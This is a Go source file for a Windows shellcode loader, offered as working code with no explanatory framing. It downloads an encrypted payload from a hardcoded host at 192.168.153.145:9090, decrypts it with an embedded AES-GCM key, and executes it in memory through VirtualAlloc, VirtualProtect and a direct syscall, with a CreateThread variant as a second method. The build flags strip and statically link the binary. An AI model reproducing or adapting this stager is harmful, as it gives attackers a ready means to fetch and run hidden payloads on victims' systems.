package main

//go build -ldflags="-s -w -extldflags -static" .\shellcode-execute.g

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

func main() {
	getFile()
	decryptFile3()
	method1_SysCall(shellcode)
}

var shellcode []byte

func getFile() {
	// Make GET request to URL
	resp, err := http.Get("http://192.168.153.145:9090/2ENC.bin")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	// Create file on local file system
	//C:\\Users\\Public\\Downloads\\ENC.bin"
	file, err := os.Create("2ENC.bin")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Copy binary data from URL to file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		panic(err)
	}
}
func decryptFile3() {
	// Reading ciphertext file
	//C:\\Users\\Public\\Downloads\\ENC.bin" /path will be used for later
	file, err := os.Open("2ENC.bin")
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	defer file.Close()

	cipherText, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
	}

	// Creating key
	key := []byte("xL3gGa4RM$S@LsSY")

	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating cipher block: %v", err)
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalf("Error creating GCM: %v", err)
	}

	// Deattached nonce and decrypt
	nonce := cipherText[:gcm.NonceSize()]
	cipherText = cipherText[gcm.NonceSize():]
	plainText, err := gcm.Open(nil, nonce, cipherText, nil)
	if err != nil {
		log.Fatalf("Error decrypting file: %v", err)
	}

	// Assign the decryption content to the global variable
	shellcode = plainText

}

func method1_SysCall(sc []byte) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.SyscallN(addr, 0, 0, 0, 0)
}

func method2_CreateThread(sc []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	CreateThread := kernel32.NewProc("CreateThread")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}
	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
	}
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
